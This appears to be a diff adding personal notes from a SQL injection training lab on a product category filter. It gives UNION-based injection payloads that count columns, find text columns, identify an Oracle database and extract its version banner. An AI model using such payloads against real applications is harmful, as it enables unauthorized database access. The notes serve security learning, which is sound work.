@@ -1,0 +1,21 @@
+SQL Injection - Product category filter
+
+End Goal - to display database version string.
+
+Analysis:
+
+1. Determine the number of columns
+
+-> ' ORDER BY 1--
+   ' ORDER BY 2--
+   ' ORDER BY 3-- (internal server error)
+
+2. Determine the datatype of columns
+
+-> ' UNION SELECT 'a', NULL--
+   ' UNION SELECT 'a', 'a'--
+   ' UNION SELECT 'a', 'a' FROM DUAL-- (Oracale database)
+
+3. Output the version of database
+
+-> ' UNION SELECT banner, NULL FROM v$version--
